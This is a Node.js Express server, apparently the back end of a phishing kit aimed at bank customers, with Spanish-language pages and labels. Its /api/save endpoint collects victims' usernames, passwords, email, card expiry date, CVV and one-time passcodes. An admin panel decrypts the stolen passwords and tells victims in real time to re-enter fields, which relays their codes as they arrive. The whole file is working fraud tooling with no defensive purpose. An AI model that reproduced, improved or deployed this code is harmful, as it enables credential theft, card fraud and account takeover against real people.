const express = require('express');
const http = require('http');
const path = require('path');
const helmet = require('helmet');
const cors = require('cors');
const cookieParser = require('cookie-parser');
const session = require('express-session');
const { Server } = require('socket.io');
const db = require('./db');
const crypto = require('crypto');
const { v4: uuidv4 } = require('uuid');
require('dotenv').config();

// AES Encryption
const AES_KEY = process.env.AES_KEY_BASE64 ? Buffer.from(process.env.AES_KEY_BASE64, 'base64') : Buffer.alloc(0);
const AES_IV = process.env.AES_IV_BASE64 ? Buffer.from(process.env.AES_IV_BASE64, 'base64') : Buffer.alloc(0);

if (AES_KEY.length !== 32 || AES_IV.length !== 16) {
  console.warn('⚠️ Warning: AES key or IV not set correctly. Check your .env');
}

function encrypt(text) {
  if (!text) return null;
  const cipher = crypto.createCipheriv('aes-256-cbc', AES_KEY, AES_IV);
  const encrypted = Buffer.concat([cipher.update(String(text), 'utf8'), cipher.final()]);
  return encrypted.toString('base64');
}

function decrypt(b64) {
  if (!b64) return null;
  const encrypted = Buffer.from(b64, 'base64');
  const decipher = crypto.createDecipheriv('aes-256-cbc', AES_KEY, AES_IV);
  const decrypted = Buffer.concat([decipher.update(encrypted), decipher.final()]);
  return decrypted.toString('utf8');
}

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' } });

app.use(helmet());
app.use(cors());
app.use(express.json({ limit: '2mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(session({
  secret: process.env.SESSION_SECRET || 'secret',
  resave: false,
  saveUninitialized: false,
  cookie: { secure: false }
}));

// --- Serve frontend (Personal) ---
app.use(express.static(path.join(__dirname, '..', 'Personal')));

// Rutas principales de la web
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, '..', 'Personal', 'Login', 'index.html'));
});
app.get('/exoneracion', (req, res) => {
  res.sendFile(path.join(__dirname, '..', 'Personal', 'Login', 'exoneracion.html'));
});
app.get('/seguridad', (req, res) => {
  res.sendFile(path.join(__dirname, '..', 'Personal', 'Login', 'seguridad.html'));
});
app.get('/confirmado', (req, res) => {
  res.sendFile(path.join(__dirname, '..', 'Personal', 'Login', 'confirmado.html'));
});

// --- Serve admin ---
app.use('/admin/static', express.static(path.join(__dirname, 'public', 'admin')));
app.use('/sounds', express.static(path.join(__dirname, 'public', 'sounds')));

// --- Admin login ---
app.post('/admin/login', (req, res) => {
  const { user, pass } = req.body;
  if (user === process.env.ADMIN_USER && pass === process.env.ADMIN_PASS) {
    req.session.admin = true;
    return res.json({ ok: true });
  }
  res.status(401).json({ ok: false });
});

app.post('/admin/logout', (req, res) => {
  req.session.destroy(() => res.json({ ok: true }));
});

function requireAdmin(req, res, next) {
  if (req.session && req.session.admin) return next();
  return res.status(401).json({ ok: false, msg: 'unauthorized' });
}

// --- API: guardar datos del usuario ---
app.post('/api/save', (req, res) => {
  const body = req.body || {};
  const clientId = body.clientId || uuidv4();

  const record = {
    clientId,
    usuario: body.usuario || body.UserName || null,
    password_enc: body.password ? encrypt(body.password) : null,
    correo: body.correo || body.Email || null,
    fecha: body.fecha || null,
    año: body.anio || body.año || null,
    cvv: body.cvv || body.cvv_code || null,
    clave_dinamica: body.clave_dinamica || body.OTPNumber || null,
    step: body.step || null
  };

  db.upsertUser(record);
  io.to('admins').emit('user_updated', db.getUserByClientId(clientId));

  const user = db.getUserByClientId(clientId);
  if (user && !user.notified) {
    io.to('admins').emit('new_user_connected', { clientId: user.clientId, usuario: user.usuario });
    db.setClientNotified(clientId);
  }

  io.to('client:' + clientId).emit('server_ack', { msg: 'saved', clientId });
  res.json({ ok: true, clientId });
});

// --- Admin API ---
app.get('/admin/records', requireAdmin, (req, res) => {
  const all = db.getAllUsers();
  res.json(all.map(r => ({ ...r, password_enc: r.password_enc })));
});

app.post('/admin/action', requireAdmin, (req, res) => {
  const { clientId, field, action } = req.body;
  if (!clientId || !action) return res.status(400).json({ ok: false });

  const note = action === 'retry' ? `retry:${field}` : `continue`;
  db.setClientCommand(clientId, note);

  io.to('client:' + clientId).emit('admin_command', {
    field,
    action,
    message: action === 'retry' ? `Debes volver a colocar tu ${field}` : 'Continua'
  });

  io.to('admins').emit('user_updated', db.getUserByClientId(clientId));
  res.json({ ok: true });
});

app.get('/admin/decrypt/:clientId', requireAdmin, (req, res) => {
  const clientId = req.params.clientId;
  const user = db.getUserByClientId(clientId);
  if (!user) return res.status(404).json({ ok: false });

  const decrypted = user.password_enc ? decrypt(user.password_enc) : null;
  res.json({ ok: true, password: decrypted });
});

// --- Admin UI ---
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin', 'index.html'));
});

// --- Socket.IO ---
io.on('connection', (socket) => {
  socket.on('register_admin', () => {
    socket.join('admins');
    socket.emit('initial_data', db.getAllUsers());
  });

  socket.on('register_client', (data) => {
    const clientId = data && data.clientId ? data.clientId : uuidv4();
    socket.join('client:' + clientId);
    db.bindSocket(clientId, socket.id);

    const user = db.getUserByClientId(clientId) || { clientId };
    socket.emit('registered', { clientId, user });
    io.to('admins').emit('new_user_connected', { clientId, usuario: user.usuario });
  });

  socket.on('disconnect', () => {});
});

// --- Start server ---
const PORT = process.env.PORT || 10000;
server.listen(PORT, () => console.log('✅ Server running on port', PORT));
